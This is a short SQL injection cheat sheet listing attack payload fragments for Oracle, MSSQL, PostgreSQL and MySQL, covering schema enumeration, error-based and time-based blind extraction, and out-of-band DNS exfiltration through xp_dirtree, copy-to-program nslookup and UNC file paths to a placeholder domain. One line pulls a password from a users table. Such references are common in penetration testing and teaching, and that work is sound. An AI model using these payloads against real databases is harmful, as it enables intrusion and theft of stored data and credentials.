# SQL Injection Cheat Sheet (Summary)

## String concatenation

* **Oracle**: `'a'||'b'`
* **MSSQL**: `'a'+'b'`
* **PostgreSQL**: `'a'||'b'`
* **MySQL**: `'a' 'b'` , `CONCAT('a','b')`

## Substring

* **Oracle**: `SUBSTR('foobar',4,2)`
* **MSSQL**: `SUBSTRING('foobar',4,2)`
* **PostgreSQL/MySQL**: `SUBSTRING('foobar',4,2)`

## Comments

* **Oracle/MSSQL/PostgreSQL**: `--` , `/*...*/`
* **MySQL**: `#` , `-- ` , `/*...*/`

## Database version

* **Oracle**: `SELECT banner FROM v$version`
* **MSSQL**: `SELECT @@version`
* **PostgreSQL**: `SELECT version()`
* **MySQL**: `SELECT @@version`

## List tables & columns

* **All DBs**: `SELECT * FROM information_schema.tables`
* **Columns**: `SELECT * FROM information_schema.columns WHERE table_name='X'`
* **Oracle**: `all_tables`, `all_tab_columns`

## Conditional errors

* **Oracle**: `CASE WHEN (cond) THEN TO_CHAR(1/0) END`
* **MSSQL**: `CASE WHEN (cond) THEN 1/0 END`
* **PostgreSQL**: `1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0))`
* **MySQL**: `IF(cond,(SELECT table_name FROM information_schema.tables),'a')`

## Extracting via error messages

* **MSSQL**: `SELECT 'foo' WHERE 1=(SELECT 'secret')`
* **PostgreSQL**: `CAST((SELECT password FROM users LIMIT 1) AS int)`
* **MySQL**: `EXTRACTVALUE(1, CONCAT(0x5c,(SELECT 'secret')))`

## Batched queries

* **MSSQL/PostgreSQL/MySQL**: `QUERY1; QUERY2`
* **Oracle**: ❌

## Time delays

* **Oracle**: `dbms_pipe.receive_message(('a'),10)`
* **MSSQL**: `WAITFOR DELAY '0:0:10'`
* **PostgreSQL**: `pg_sleep(10)`
* **MySQL**: `SLEEP(10)`

## Conditional time delays

* **Oracle**: `CASE WHEN (cond) THEN dbms_pipe.receive_message(('a'),10)`
* **MSSQL**: `IF(cond) WAITFOR DELAY '0:0:10'`
* **PostgreSQL**: `CASE WHEN (cond) THEN pg_sleep(10)`
* **MySQL**: `IF(cond,SLEEP(10),'a')`

## DNS lookup

* **Oracle**: `EXTRACTVALUE(xmltype('<!DOCTYPE ...>'),'/l')`
* **MSSQL**: `exec master..xp_dirtree '//DOMAIN/a'`
* **PostgreSQL**: `copy (SELECT '') to program 'nslookup DOMAIN'`
* **MySQL (Windows)**: `LOAD_FILE('\\\\DOMAIN\\a')` , `...INTO OUTFILE '\\\\DOMAIN\\a'`

## DNS exfiltration

* **Oracle**: `EXTRACTVALUE(xmltype('<!DOCTYPE ...'||(SELECT QUERY)||'.DOMAIN>'),'/l')`
* **MSSQL**: `declare @p varchar(1024); set @p=(SELECT QUERY); exec('master..xp_dirtree "//'+@p+'.DOMAIN/a"')`
* **PostgreSQL**: Function → `nslookup QUERY.DOMAIN`
* **MySQL (Windows)**: `SELECT QUERY INTO OUTFILE '\\\\DOMAIN\\a'`

---
